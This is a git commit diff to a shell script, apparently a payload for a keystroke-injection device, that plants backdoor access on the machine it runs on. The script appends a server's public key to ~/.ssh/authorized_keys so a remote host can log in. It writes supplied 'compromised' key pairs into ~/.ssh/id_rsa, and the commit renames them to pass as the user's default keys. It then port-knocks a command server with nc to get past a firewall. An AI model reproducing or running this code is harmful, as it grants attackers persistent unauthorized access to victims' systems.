df0280b17b1ef03fe2359c77d62a79c3fe9797d3
Desperationis <fork_important@pm.me>
2025-05-06 13:52:28 -0400

    fix more

--- ducky/script.sh
+++ ducky/script.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-set -euo pipefail
+set -u
 
 # Allow server to login to us
 mkdir -p ~/.ssh
@@ -9,9 +9,11 @@ echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 echo "Injected server public key."
 
-echo "$COMPROMISED_PUBLIC_KEY" >> ~/.ssh/COMPROMISED.pub
-echo "$COMPROMISED_PRIVATE_KEY" >> ~/.ssh/COMPROMISED
+echo "$COMPROMISED_PUBLIC_KEY" >> ~/.ssh/id_rsa.pub
+echo "$COMPROMISED_PRIVATE_KEY" >> ~/.ssh/id_rsa
 echo "Injected compromised keys."
+
+chmod 600 ~/.ssh/id_rsa
 
 # Bypass server firewall via knock
 for port in $KNOCK_OPEN_TUNNEL; do echo | nc $C_SERVER $port; sleep 0.1; done
